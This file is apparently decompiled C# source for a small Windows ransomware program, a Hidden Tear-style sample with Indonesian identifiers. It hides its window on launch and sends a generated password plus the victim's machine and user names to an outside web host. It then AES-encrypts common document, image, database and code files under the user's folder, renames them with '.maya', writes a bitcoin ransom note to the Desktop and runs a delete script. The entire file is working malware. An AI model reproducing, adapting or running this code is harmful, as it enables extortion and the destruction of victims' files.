using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace MIni_Ransomware;

public class Form1 : Form
{
	private string string_0 = "https://www.gunnylab.com/ransom/write.php?info=";

	private string string_1 = Environment.UserName;

	private string string_2 = Environment.MachineName.ToString();

	private string string_3 = "C:\\Users\\";

	private IContainer icontainer_0 = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Control)this).set_Visible(false);
		((Form)this).set_ShowInTaskbar(false);
		Mulai();
	}

	public byte[] EnkripsiAES(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string BuatPassword(int panjang)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < panjang--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void KirimPassword(string password)
	{
		string text = string_2 + "-" + string_1 + " " + password;
		string address = string_0 + text;
		try
		{
			new WebClient().DownloadString(address);
		}
		catch
		{
			File.WriteAllText(Path.GetTempPath() + "isa2017.txt", password);
		}
	}

	public void EnkripsiFile(string file, string password_)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password_);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = EnkripsiAES(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".maya");
		Console.WriteLine(file);
	}

	public void EnkripsiDir(string location, string password)
	{
		string[] source = new string[21]
		{
			".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png",
			".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
			".ai"
		};
		string[] files = Directory.GetFiles(location);
		string[] directories = Directory.GetDirectories(location);
		for (int i = 0; i < files.Length; i++)
		{
			try
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EnkripsiFile(files[i], password);
				}
			}
			catch
			{
			}
		}
		for (int j = 0; j < directories.Length; j++)
		{
			try
			{
				EnkripsiDir(directories[j], password);
			}
			catch
			{
			}
		}
	}

	public void Mulai()
	{
		string password = BuatPassword(16);
		string location = (string_3 + string_1) ?? "";
		KirimPassword(password);
		EnkripsiDir(location, password);
		BikinNote();
		password = null;
		try
		{
			Process.Start("delete.bat");
		}
		catch
		{
		}
		Application.Exit();
	}

	public void BikinNote()
	{
		string path = string_3 + string_1 + "\\Desktop\\READ ME.txt";
		string[] contents = new string[3] { "File-file anda dienkripsi oleh Mini Ransom", "Kirim saya bitcoin ke //todo", "Dan semua file anda kembali lagi HAHAHAHA :P" };
		File.WriteAllLines(path, contents);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(124, 53));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("hidden tear");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
